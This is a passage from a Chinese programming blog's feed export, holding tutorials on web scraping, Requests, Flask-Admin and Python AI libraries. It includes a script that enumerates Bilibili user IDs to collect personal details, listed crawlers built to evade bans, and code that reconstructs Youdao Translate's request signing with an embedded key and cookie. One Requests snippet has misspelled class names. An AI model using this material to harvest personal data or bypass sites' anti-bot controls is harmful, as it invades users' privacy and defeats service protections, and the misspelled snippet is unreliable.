float(fan_num_text[:-1]) * 10000</span><br><span class="line"></span><br><span class="line">            # 以span是否存在作为网页是否加载成功的依据</span><br><span class="line">            if (span != None):</span><br><span class="line">                nickname = span.text</span><br><span class="line">                print(nickname, sex, level, uid, regtime_text[3:].strip(), birthday_text, geo_text, fan_num_text)</span><br><span class="line">                row = [nickname, sex, level, uid, regtime_text[3:].strip(), birthday_text, geo_text, fan_num_text]</span><br><span class="line">                csv_writer.writerow(row)</span><br><span class="line"></span><br><span class="line">            # print(bsObj.find(id=&quot;h-name&quot;).get_text())</span><br><span class="line">            urlNumber += pace</span><br><span class="line">            counter += 1</span><br><span class="line">            fail_num = 0</span><br><span class="line">            driver.get(&quot;http://about:blank&quot;)</span><br><span class="line">        except TimeoutException:</span><br><span class="line">            urlNumber += pace</span><br><span class="line">            fail_num += 1</span><br><span class="line">            #如果连续失败三次，说明被反爬虫或大片的uid不存在</span><br><span class="line">            if(fail_num &gt; 2):</span><br><span class="line">                driver.get(&quot;https://www.bilibili.com/&quot;)</span><br><span class="line">                print(&apos;sleep 30s&apos;)</span><br><span class="line">                #缓一缓歇会儿再爬</span><br><span class="line">                time.sleep(30)</span><br><span class="line">                #连续失败次数清零，重新计数</span><br><span class="line">                fail_num = 0</span><br><span class="line">                #跳过不存在的uid</span><br><span class="line">                urlNumber += 250000</span><br><span class="line">                #PHANTOMJS可能存在一种BUG，多进程爬取时网页的信息会弄串了，访问空白页可以重置</span><br><span class="line">                driver.get(&quot;http://about:blank&quot;)</span><br><span class="line"></span><br><span class="line">    driver.close()</span><br><span class="line"></span><br><span class="line">    end = time.time()</span><br><span class="line">    print(&apos;Task %s runs %0.2f seconds.&apos; % (num, (end - start)))</span><br><span class="line"></span><br><span class="line"># 主程序</span><br><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">    # 记录开始时间</span><br><span class="line">    start_time = time.time()</span><br><span class="line"></span><br><span class="line">    #从哪一条id开始爬取</span><br><span class="line">    crawler_start = 0</span><br><span class="line">    #进程数</span><br><span class="line">    crawler_num = 1</span><br><span class="line">    #每个进程要爬取的有效数据量</span><br><span class="line">    crawler_sum = 10000</span><br><span class="line">    #隔多少id爬取一次</span><br><span class="line">    crawler_pace = 2500</span><br><span class="line">    print(&apos;Parent process %s.&apos; % os.getpid())</span><br><span class="line">    #进程池</span><br><span class="line">    p = Pool(crawler_num)</span><br><span class="line">    #启动进程</span><br><span class="line">    for i in range(crawler_num):</span><br><span class="line">        p.apply_async(scrawler_process, args=(crawler_start, i, crawler_sum, crawler_pace,))</span><br><span class="line">    print(&apos;Waiting for all subprocesses done...&apos;)</span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line">    print(&apos;All subprocesses done.&apos;)</span><br><span class="line"></span><br><span class="line">    end_time = time.time()</span><br><span class="line">    print(end_time - start_time)</span><br></pre></td></tr></table></figure></p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2019/05/26/python-google-driver/">google web驱动下载，selenium谷歌驱动下载</a></li></ul></div>]]></content>
      <categories>
        <category>selenium</category>
      </categories>
      <tags>
        <tag>selenium</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows系统不重启而使环境变量生效的方法</title>
    <url>/2019/05/26/windows-1/</url>
    <content><![CDATA[<p>Windows系统不重启而使环境变量生效的方法<br><a id="more"></a></p>
<h1 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h1><p>修改完windows的环境变量之后，不用重启电脑就可以使环境变量生效！</p>
<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><ol>
<li>修改完成后，运行cmd命令进入DOS命令提示符，输入：”set PATH=C:”</li>
<li>关闭DOS窗口。再次运行cmd命令打开dos窗口，输入：”echo %PATH%” ，可以发现“我的电脑”-&gt;“属性”-&gt;“高级”-&gt;“环境变量”中设置的 PATH 值已经生效。</li>
</ol>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2019/02/06/windows_icon/">windows 10完美去除快捷方式图标小箭头的方法</a></li><li><a href="https://thelighter.github.io/2019/02/06/windows_tab/">Windows cmd tab键自动补全功能如何启</a></li></ul></div>]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>python人工智能必会的模块扩展</title>
    <url>/2019/05/26/python-ai/</url>
    <content><![CDATA[<p> python人工智能必会的模块扩展<br><a id="more"></a></p>
<h1 id="NumPy"><a href="#NumPy" class="headerlink" title="NumPy"></a>NumPy</h1><p>NumPy 提供了许多数学计算的数据结构和方法，较 Python 自身的 list 效率高很多。它提供的 ndarray 大大简化了矩阵运算。</p>
<h1 id="Pandas"><a href="#Pandas" class="headerlink" title="Pandas"></a>Pandas</h1><p>基于 NumPy 实现的数据处理工具。提供了大量数据统计、分析方面的模型和方法。一维的 Series，二维的 DataFrame 和三维的 Panel 是其主要的数据结构。</p>
<h1 id="SciPy"><a href="#SciPy" class="headerlink" title="SciPy"></a>SciPy</h1><p>进行科学计算的 Python 工具包，提供了诸如微积分、线性代数、信号处理、傅里叶变换、曲线拟合等众多方法。</p>
<h1 id="Matplotlib"><a href="#Matplotlib" class="headerlink" title="Matplotlib"></a>Matplotlib</h1><p>Python 最基础的绘图工具。功能丰富，定制性强，几乎可满足日常各类绘图需求，但配置较复杂。</p>
<p>只要你用 Python 和数据打交道，就绕不开以上这几个库，所以务必学习一下。</p>
<p>而在此之后，你就需要根据自己的具体方向，选择更专业的工具包进行研究和应用。Python 在人工智能方面最有名的工具库主要有：</p>
<h1 id="Scikit-Learn"><a href="#Scikit-Learn" class="headerlink" title="Scikit-Learn"></a>Scikit-Learn</h1><p><a href="http://scikit-learn.org" target="_blank" rel="noopener">http://scikit-learn.org</a></p>
<p>Scikit-Learn 是用 Python 开发的机器学习库，其中包含大量机器学习算法、数据集，是数据挖掘方便的工具。它基于 NumPy、SciPy 和 Matplotlib，可直接通过 pip 安装。</p>
<h1 id="TensorFlow"><a href="#TensorFlow" class="headerlink" title="TensorFlow"></a>TensorFlow</h1><p><a href="http://tensorflow.org" target="_blank" rel="noopener">http://tensorflow.org</a></p>
<p>TensorFlow 最初由 Google 开发，用于机器学习的研究。TensorFlow 可以在 GPU 或 CPU 上运行，在深度学习领域表现优异。目前无论是在学术研究还是工程应用中都被广泛使用。但 TensorFlow 相对来说更底层，更多时候我们会使用基于它开发的其他框架。</p>
<h1 id="Theano"><a href="#Theano" class="headerlink" title="Theano"></a>Theano</h1><p><a href="http://deeplearning.net/software/theano/" target="_blank" rel="noopener">http://deeplearning.net/software/theano/</a></p>
<p>Theano 是成熟而稳定的深度学习库。与 TensorFlow 类似，它是一个比较底层的库，适合数值计算优化，支持 GPU 编程。有很多基于 Theano 的库都在利用其数据结构，但对于开发来说，它的接口并不是很友好。</p>
<h1 id="Keras"><a href="#Keras" class="headerlink" title="Keras"></a>Keras</h1><p><a href="http://keras.io" target="_blank" rel="noopener">http://keras.io</a></p>
<p>Keras 是一个高度模块化的神经网络库，用 Python 编写，能够在 TensorFlow 或 Theano 上运行。它的接口非常简单易用，大大提升了开发效率。</p>
<h1 id="Caffe"><a href="#Caffe" class="headerlink" title="Caffe"></a>Caffe</h1><p><a href="http://caffe.berkeleyvision.org" target="_blank" rel="noopener">http://caffe.berkeleyvision.org</a></p>
<p>Caffe 在深度学习领域名气很大。它由伯克利视觉和学习中心（BVLC）和社区贡献者开发，具有模块化、高性能的优点，尤其在计算机视觉领域有极大的优势。Caffe 本身并不是一个 Python 库，但它提供了 Python 的接口。</p>
<h1 id="PyTorch"><a href="#PyTorch" class="headerlink" title="PyTorch"></a>PyTorch</h1><p><a href="http://pytorch.org" target="_blank" rel="noopener">http://pytorch.org</a></p>
<p>Torch 也是一个老牌机器学习库。Facebook 人工智能研究所用的框架是 Torch，DeepMind 在被谷歌收购之前用的也是 Torch（后转为 TensorFlow），足见其能力。但因 Lua 语言导致其不够大众。直到它的 Python 实现版本 PyTorch 的出现。</p>
<h1 id="MXNet"><a href="#MXNet" class="headerlink" title="MXNet"></a>MXNet</h1><p><a href="http://mxnet.incubator.apache.org" target="_blank" rel="noopener">http://mxnet.incubator.apache.org</a></p>
<p>亚马逊 AWS 的默认深度学习引擎，分布式计算是它的特色之一，支持多个 CPU/GPU 训练网络。</p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/16/python-3/">python的深拷贝和浅拷贝区别</a></li><li><a href="https://thelighter.github.io/2020/01/30/sphinx/">sphinx教程，免费搭建你的文档网站</a></li><li><a href="https://thelighter.github.io/2019/05/26/requeset-1/">Python Requests用法总结大全</a></li></ul></div>]]></content>
      <categories>
        <category>python人工智能</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python Requests用法总结大全</title>
    <url>/2019/05/26/requeset-1/</url>
    <content><![CDATA[<p>Python Requests 小技巧总结<br><a id="more"></a></p>
<h1 id="保持请求之间的Cookies，我们可以这样做。"><a href="#保持请求之间的Cookies，我们可以这样做。" class="headerlink" title="保持请求之间的Cookies，我们可以这样做。"></a>保持请求之间的Cookies，我们可以这样做。</h1><p>import requests<br>self.session = requests.Session()<br>self.session.get(login_url) # 可以保持登录态</p>
<h1 id="默认requests请求失败后不会重试，但是我们跑case时难免遇到一些网络-服务重启，外部原因导致case失败，我们可以在Session实例上附加HTTPAdapaters-参数，增加失败重试次数。"><a href="#默认requests请求失败后不会重试，但是我们跑case时难免遇到一些网络-服务重启，外部原因导致case失败，我们可以在Session实例上附加HTTPAdapaters-参数，增加失败重试次数。" class="headerlink" title="默认requests请求失败后不会重试，但是我们跑case时难免遇到一些网络,服务重启，外部原因导致case失败，我们可以在Session实例上附加HTTPAdapaters 参数，增加失败重试次数。"></a>默认requests请求失败后不会重试，但是我们跑case时难免遇到一些网络,服务重启，外部原因导致case失败，我们可以在Session实例上附加HTTPAdapaters 参数，增加失败重试次数。</h1><p>request_retry = requests.adapatrs.HTTPAdapaters(max_retries=3）</p>
<p>self.session.mount(‘https://‘,request_retry)<br>self.session.mount(‘http://‘,request_retry)</p>
<p>这样，之后的请求，若失败，重试3次。</p>
<h1 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h1><p>网络请求中可能会遇到重定向，我们需要一次处理一个请求，可以把重定向禁止。</p>
<p>self.session.post(url,data,allow_redirects=False)</p>
<h1 id="post请求提交json格式数据时-请求头为-“Content-Type”-“application-json”-，一般先要把python对象转换成json对象。可能很多时候是这样写："><a href="#post请求提交json格式数据时-请求头为-“Content-Type”-“application-json”-，一般先要把python对象转换成json对象。可能很多时候是这样写：" class="headerlink" title="post请求提交json格式数据时(请求头为:{“Content-Type”: “application/json”})，一般先要把python对象转换成json对象。可能很多时候是这样写："></a>post请求提交json格式数据时(请求头为:{“Content-Type”: “application/json”})，一般先要把python对象转换成json对象。可能很多时候是这样写：</h1><p>self.session.post(url, data=json.dumps(data))。</p>
<p>其实post有一个默认参数json，可以直接简写成：<br> self.session.post(url, json=data)</p>
<p>#：写接口请求，debug时，会需要看下代码请求的详细信息，当然我们可以使用fiddler来查看，其实我们自己也可以在代码这样获取debug信息*</p>
<p>import requests<br>import logging<br>import httplib as http_client</p>
<p>http_client.HTTPConnection.debuglevel = 1</p>
<p>logging.basicConfig()<br>logging.getLogger().setLevel(logging.DEBUG)<br>requests_log = logging.getLogger(“requests.packages.urllib3”)<br>requests_log.setLevel(logging.DEBUG)<br>requests_log.propagate = True</p>
<p>requests.get(‘<a href="https://www.baidu.com&#39;" target="_blank" rel="noopener">https://www.baidu.com&#39;</a>)</p>
<h1 id="使用grequests实现异步请求。"><a href="#使用grequests实现异步请求。" class="headerlink" title="使用grequests实现异步请求。"></a>使用grequests实现异步请求。</h1><p>pip install grequests</p>
<p>import grequests</p>
<p>urls = [<br>    ‘<a href="http://www.url1.com&#39;" target="_blank" rel="noopener">http://www.url1.com&#39;</a>,<br>    ‘<a href="http://www.url2.com&#39;" target="_blank" rel="noopener">http://www.url2.com&#39;</a>,<br>    ‘<a href="http://www.url3.com&#39;" target="_blank" rel="noopener">http://www.url3.com&#39;</a>,<br>    ‘<a href="http://www.url4.com&#39;" target="_blank" rel="noopener">http://www.url4.com&#39;</a>,<br>    ‘<a href="http://www.url5.com&#39;" target="_blank" rel="noopener">http://www.url5.com&#39;</a>,<br>    ‘<a href="http://www.url6.com&#39;" target="_blank" rel="noopener">http://www.url6.com&#39;</a>,<br>]</p>
<p>resp = (grequests.get(u) for u in urls)<br>grequests.map(resp)</p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/16/python-3/">python的深拷贝和浅拷贝区别</a></li><li><a href="https://thelighter.github.io/2020/01/30/sphinx/">sphinx教程，免费搭建你的文档网站</a></li><li><a href="https://thelighter.github.io/2019/05/26/python-ai/">python人工智能必会的模块扩展</a></li></ul></div>]]></content>
      <categories>
        <category>request</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>spider爬虫必会项目</title>
    <url>/2019/05/25/spider-1/</url>
    <content><![CDATA[<p>Python 爬虫进公司必会项目<br><a id="more"></a></p>
<p>WechatSogou [1]– 微信公众号爬虫。 基于搜狗微信搜索的微信公众号爬虫接口，可以扩展成基于搜狗搜索的爬虫，返回结果是列表，每一项均是公众号具体信息字典。 github地址： <a href="https://github.com/Chyroc/WechatSogou" target="_blank" rel="noopener">https://github.com/Chyroc/WechatSogou</a></p>
<p>DouBanSpider [2]– 豆瓣读书爬虫。 可以爬下豆瓣读书标签下的所有图书，按评分排名依次存储，存储到Excel中，可方便大家筛选搜罗，比如筛选评价人数&gt;1000的高分书籍；可依据不同的主题存储到Excel不同的Sheet ，采用User Agent伪装为浏览器进行爬取，并加入随机延时来更好的模仿浏览器行为，避免爬虫被封。 github地址： <a href="https://github.com/lanbing510/DouBanSpider" target="_blank" rel="noopener">https://github.com/lanbing510/DouBanSpider</a></p>
<p>zhihu_spider [3]– 知乎爬虫。 此项目的功能是爬取知乎用户信息以及人际拓扑关系，爬虫框架使用scrapy，数据存储使用mongo github地址： <a href="https://github.com/LiuRoy/zhihu_spider" target="_blank" rel="noopener">https://github.com/LiuRoy/zhihu_spider</a></p>
<p>bilibili-user [4]– Bilibili用户爬虫。 总数据数：20119918，抓取字段：用户id，昵称，性别，头像，等级，经验值，粉丝数，生日，地址，注册时间，签名，等级与经验值等。抓取之后生成B站用户数据报告。 github地址： <a href="https://github.com/airingursb/bilibili-user" target="_blank" rel="noopener">https://github.com/airingursb/bilibili-user</a></p>
<p>SinaSpider [5]– 新浪微博爬虫。 主要爬取新浪微博用户的个人信息、微博信息、粉丝和关注。代码获取新浪微博Cookie进行登录，可通过多账号登录来防止新浪的反扒。主要使用 scrapy 爬虫框架。 github地址： <a href="https://github.com/LiuXingMing/SinaSpider" target="_blank" rel="noopener">https://github.com/LiuXingMing/SinaSpider</a></p>
<p>distribute_crawler [6]– 小说下载分布式爬虫。 使用scrapy,Redis, MongoDB,graphite实现的一个分布式网络爬虫,底层存储MongoDB集群,分布式使用Redis实现,爬虫状态显示使用graphite实现，主要针对一个小说站点。 github地址： <a href="https://github.com/gnemoug/distribute_crawler" target="_blank" rel="noopener">https://github.com/gnemoug/distribute_crawler</a></p>
<p>CnkiSpider [7]– 中国知网爬虫。 设置检索条件后，执行src/CnkiSpider.py抓取数据，抓取数据存储在/data目录下，每个数据文件的第一行为字段名称。 github地址： <a href="https://github.com/yanzhou/CnkiSpider" target="_blank" rel="noopener">https://github.com/yanzhou/CnkiSpider</a></p>
<p>LianJiaSpider [8]– 链家网爬虫。 爬取北京地区链家历年二手房成交记录。涵盖链家爬虫一文的全部代码，包括链家模拟登录代码。 github地址： <a href="https://github.com/lanbing510/LianJiaSpider" target="_blank" rel="noopener">https://github.com/lanbing510/LianJiaSpider</a></p>
<p>scrapy_jingdong [9]– 京东爬虫。 基于scrapy的京东网站爬虫，保存格式为csv。 github地址： <a href="https://github.com/taizilongxu/scrapy_jingdong" target="_blank" rel="noopener">https://github.com/taizilongxu/scrapy_jingdong</a></p>
<p>QQ-Groups-Spider [10]– QQ 群爬虫。 批量抓取 QQ 群信息，包括群名称、群号、群人数、群主、群简介等内容，最终生成 XLS(X) / CSV 结果文件。 github地址：<a href="https://github.com/caspartse/QQ-Groups-Spider" target="_blank" rel="noopener">https://github.com/caspartse/QQ-Groups-Spider</a></p>
<p>wooyun_public[11]-乌云爬虫。 乌云公开漏洞、知识库爬虫和搜索。全部公开漏洞的列表和每个漏洞的文本内容存在MongoDB中，大概约2G内容；如果整站爬全部文本和图片作为离线查询，大概需要10G空间、2小时（10M电信带宽）；爬取全部知识库，总共约500M空间。漏洞搜索使用了Flask作为web server，bootstrap作为前端。 <a href="https://github.com/hanc00l/wooyun_public" target="_blank" rel="noopener">https://github.com/hanc00l/wooyun_public</a></p>
<p>spider[12]– hao123网站爬虫。 以hao123为入口页面，滚动爬取外链，收集网址，并记录网址上的内链和外链数目，记录title等信息，windows7 32位上测试，目前每24个小时，可收集数据为10万左右 <a href="https://github.com/simapple/spider" target="_blank" rel="noopener">https://github.com/simapple/spider</a> findtrip [13]– 机票爬虫（去哪儿和携程网）。 Findtrip是一个基于Scrapy的机票爬虫，目前整合了国内两大机票网站（去哪儿 + 携程）。 <a href="https://github.com/fankcoder/findtrip" target="_blank" rel="noopener">https://github.com/fankcoder/findtrip</a></p>
<p>163spider [14] – 基于requests、MySQLdb、torndb的网易客户端内容爬虫 <a href="https://github.com/leyle/163spider" target="_blank" rel="noopener">https://github.com/leyle/163spider</a></p>
<p>doubanspiders[15]– 豆瓣电影、书籍、小组、相册、东西等爬虫集 <a href="https://github.com/fanpei91/doubanspiders" target="_blank" rel="noopener">https://github.com/fanpei91/doubanspiders</a></p>
<p>QQSpider [16]– QQ空间爬虫，包括日志、说说、个人信息等，一天可抓取 400 万条数据。 <a href="https://github.com/LiuXingMing/QQSpider" target="_blank" rel="noopener">https://github.com/LiuXingMing/QQSpider</a></p>
<p>baidu-music-spider [17]– 百度mp3全站爬虫，使用redis支持断点续传。 <a href="https://github.com/Shu-Ji/baidu-music-spider" target="_blank" rel="noopener">https://github.com/Shu-Ji/baidu-music-spider</a></p>
<p>tbcrawler[18]– 淘宝和天猫的爬虫,可以根据搜索关键词,物品id来抓去页面的信息，数据存储在mongodb。 <a href="https://github.com/pakoo/tbcrawler" target="_blank" rel="noopener">https://github.com/pakoo/tbcrawler</a></p>
<p>stockholm [19]– 一个股票数据（沪深）爬虫和选股策略测试框架。根据选定的日期范围抓取所有沪深两市股票的行情数据。支持使用表达式定义选股策略。支持多线程处理。保存数据到JSON文件、CSV文件。 <a href="https://github.com/benitoro/stockholm" target="_blank" rel="noopener">https://github.com/benitoro/stockholm</a></p>
<p>BaiduyunSpider[20]-百度云盘爬虫。 <a href="https://github.com/k1995/BaiduyunSpider" target="_blank" rel="noopener">https://github.com/k1995/BaiduyunSpider</a></p>
<p>Spider[21]-社交数据爬虫。支持微博,知乎,豆瓣。 <a href="https://github.com/Qutan/Spider" target="_blank" rel="noopener">https://github.com/Qutan/Spider</a></p>
<p>proxy pool[22]-Python爬虫代理IP池(proxy pool)。 <a href="https://github.com/jhao104/proxy_pool" target="_blank" rel="noopener">https://github.com/jhao104/proxy_pool</a></p>
<p>music-163[23]-爬取网易云音乐所有歌曲的评论。 <a href="https://github.com/RitterHou/music-163" target="_blank" rel="noopener">https://github.com/RitterHou/music-163</a></p>
<p>转载：<a href="http://www.sohu.com/a/166385794_804770" target="_blank" rel="noopener">http://www.sohu.com/a/166385794_804770</a></p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



]]></content>
      <categories>
        <category>spider</category>
      </categories>
      <tags>
        <tag>spider</tag>
      </tags>
  </entry>
  <entry>
    <title>flask-admin如何自己添加一个具有功能的按钮，Flask-Admin 增加自定义Action</title>
    <url>/2019/05/25/flask-admin-1/</url>
    <content><![CDATA[<p>Flask-Admin 增加自定义Action<br><a id="more"></a></p>
<h1 id="图片示例"><a href="#图片示例" class="headerlink" title="图片示例"></a>图片示例</h1><p><img src="https://ask.qcloudimg.com/http-save/yehe-1416054/i08kbvd7sb.jpeg?imageView2/2/w/1620" alt></p>
<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class UserView(ModelView):</span><br><span class="line">    column_default_sort = (&apos;active&apos;, False)</span><br><span class="line">    column_list = (&apos;name&apos;, &apos;email&apos;, &apos;active&apos;, &apos;roles&apos;)</span><br><span class="line">    column_filters = (&apos;name&apos;, &apos;active&apos;)</span><br><span class="line">    form_create_rules = (&apos;name&apos;, &apos;avatar&apos;, &apos;email&apos;, &apos;active&apos;, &apos;roles&apos;)</span><br><span class="line"></span><br><span class="line"># 这里通过 column_extra_row_actions 来添加一个按钮和按钮对应的操作 </span><br><span class="line"># &apos;off glyphicon glyphicon-off&apos; 指的是图标，这里基于bootstrap</span><br><span class="line">#  &apos;user.activate_user_view&apos;指的是对应的方法  user是你绑定的名称 </span><br><span class="line">    column_extra_row_actions = [</span><br><span class="line">        EndpointLinkRowAction(</span><br><span class="line">            &apos;off glyphicon glyphicon-off&apos;,</span><br><span class="line">            &apos;user.activate_user_view&apos;,</span><br><span class="line">        )</span><br><span class="line">    ]</span><br><span class="line"># 图标的方法，数据的id可以 request.args.get 获取</span><br><span class="line">    @expose(&apos;/activate/&apos;, methods=(&apos;GET&apos;,))</span><br><span class="line">    def activate_user_view(self):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">            Activate user model view. Only GET method is allowed.</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        return_url = get_redirect_target() or self.get_url(&apos;.index_view&apos;)</span><br><span class="line"></span><br><span class="line">        id = request.args[&quot;id&quot;]</span><br><span class="line">        model = self.get_one(id)</span><br><span class="line"></span><br><span class="line">        if model is None:</span><br><span class="line">            flash(gettext(&apos;用户不存在&apos;), &apos;error&apos;)</span><br><span class="line">            return redirect(return_url)</span><br><span class="line"></span><br><span class="line">        if model.active:</span><br><span class="line">            flash(gettext(&apos;已经激活， 无需重复激活.&apos;), &apos;warning&apos;)</span><br><span class="line">            return redirect(return_url)</span><br><span class="line"></span><br><span class="line">        model.active = True</span><br><span class="line">        model.save()</span><br><span class="line"></span><br><span class="line">        flash(gettext(&apos;已激活&apos;), &apos;success&apos;)</span><br><span class="line">        return redirect(return_url)</span><br></pre></td></tr></table></figure>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2019/06/11/flask-admin-4/">flask-admin如何给用户分配权限</a></li><li><a href="https://thelighter.github.io/2019/06/09/flask-admin-3/">flask-admin上传图片到服务器</a></li><li><a href="https://thelighter.github.io/2019/06/04/flask-admin-2/">flask-admin后台如何显示图片</a></li></ul></div>]]></content>
      <categories>
        <category>flask-admin</category>
      </categories>
      <tags>
        <tag>flask-admin</tag>
      </tags>
  </entry>
  <entry>
    <title>python解密，js加密分析——有道在线翻译</title>
    <url>/2019/05/25/js-youdao/</url>
    <content><![CDATA[<p>python爬虫教程-16-破解js加密实例（有道在线翻译）<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 破解js加密，版本2</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">通过在js文件中查找salt或者sign，可以找到</span><br><span class="line">1.可以找到这个计算salt的公式</span><br><span class="line">r = &quot;&quot; + ((new Date).getTime() + parseInt(10 * Math.random(), 10))</span><br><span class="line">2.sign：n.md5(&quot;fanyideskweb&quot; + t + r + &quot;ebSeFb%=XZ%T[KZ)c(sy!&quot;);</span><br><span class="line">md5 一共需要四个参数，第一个和第四个都是固定值得字符串，第三个是所谓的salt，</span><br><span class="line">第二个参数是输入的需要翻译的单词</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">from urllib import request, parse</span><br><span class="line"></span><br><span class="line">def getSalt():</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    salt的公式r = &quot;&quot; + ((new Date).getTime() + parseInt(10 * Math.random(), 10))</span><br><span class="line">    把它翻译成python代码</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    import time, random</span><br><span class="line"></span><br><span class="line">    salt = int(time.time()*1000) + random.randint(0, 10)</span><br><span class="line"></span><br><span class="line">    return salt</span><br><span class="line"></span><br><span class="line">def getMD5(v):</span><br><span class="line">    import hashlib</span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line"></span><br><span class="line">    md5.update(v.encode(&apos;utf-8&apos;))</span><br><span class="line">    sign = md5.hexdigest()</span><br><span class="line"></span><br><span class="line">    return sign</span><br><span class="line"></span><br><span class="line">def getSign(key, salt):</span><br><span class="line"></span><br><span class="line">    sign = &quot;fanyideskweb&quot; + key + str(salt) + &quot;ebSeFb%=XZ%T[KZ)c(sy!&quot;</span><br><span class="line">    sign = getMD5(sign)</span><br><span class="line">    return sign</span><br><span class="line"></span><br><span class="line">def youdao(key):</span><br><span class="line">    # url从http://fanyi.youdao.com输入词汇右键检查得到</span><br><span class="line">    url = &quot;http://fanyi.youdao.com/translate_o?smartresult=dict&amp;smartresult=true&quot;</span><br><span class="line"></span><br><span class="line">    salt = getSalt()</span><br><span class="line">    # data从右键检查FormData得到</span><br><span class="line">    data = &#123;</span><br><span class="line">        &quot;i&quot;: key,</span><br><span class="line">        &quot;from&quot;: &quot;AUTO&quot;,</span><br><span class="line">        &quot;to&quot;: &quot;AUTO&quot;,</span><br><span class="line">        &quot;smartresult&quot;: &quot;dict&quot;,</span><br><span class="line">        &quot;client&quot;: &quot;fanyideskweb&quot;,</span><br><span class="line">        &quot;salt&quot;: str(salt),</span><br><span class="line">        &quot;sign&quot;: getSign(key, salt),</span><br><span class="line">        &quot;doctype&quot;: &quot;json&quot;,</span><br><span class="line">        &quot;version&quot;: &quot;2.1&quot;,</span><br><span class="line">        &quot;keyform&quot;: &quot;fanyi.web&quot;,</span><br><span class="line">        &quot;action&quot;: &quot;FY_BY_REALTIME&quot;,</span><br><span class="line">        &quot;typoResult&quot;: &quot;false&quot;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    print(data)</span><br><span class="line">    # 对data进行编码，因为参数data需要bytes格式</span><br><span class="line">    data = parse.urlencode(data).encode()</span><br><span class="line"></span><br><span class="line">    # headers从右键检查Request Headers得到</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;Accept&quot;: &quot;application/json, text/javascript, */*; q=0.01&quot;,</span><br><span class="line">        &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;,</span><br><span class="line">        &quot;Connection&quot;: &quot;keep-alive&quot;,</span><br><span class="line">        &quot;Content-Length&quot;: len(data),</span><br><span class="line">        &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;,</span><br><span class="line">        &quot;Cookie&quot;: &quot;OUTFOX_SEARCH_USER_ID=685021846@10.168.8.76; OUTFOX_SEARCH_USER_ID_NCOO=366356259.5731474; _ntes_nnid=1f61e8bddac5e72660c6d06445559ffb,1535033370622; JSESSIONID=aaaVeQTI9KXfqfVBNsXvw; ___rl__test__cookies=1535204044230&quot;,</span><br><span class="line">        &quot;Host&quot;: &quot;fanyi.youdao.com&quot;,</span><br><span class="line">        &quot;Origin&quot;: &quot;http://fanyi.youdao.com&quot;,</span><br><span class="line">        &quot;Referer&quot;: &quot;http://fanyi.youdao.com/&quot;,</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 